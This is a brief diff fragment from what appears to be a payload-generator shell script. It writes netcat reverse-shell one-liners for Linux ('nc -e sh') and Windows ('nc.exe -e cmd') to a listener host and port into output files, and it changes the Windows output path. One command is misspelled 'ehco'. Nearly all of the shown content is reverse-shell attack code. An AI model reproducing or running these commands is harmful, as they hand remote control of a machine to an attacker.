@@ -11,4 +11,4 @@ nc -e sh $LHOST $LPORT
 """ >> ../wd-generated/ncatshelllinux.sh
 ehco """
 nc.exe -e cmd $LHOST $LPORT
-""" >> ../wd-generated/ncatshellwindows.sh
+""" >> /opt/wd-generated/ncatshellwindows.sh
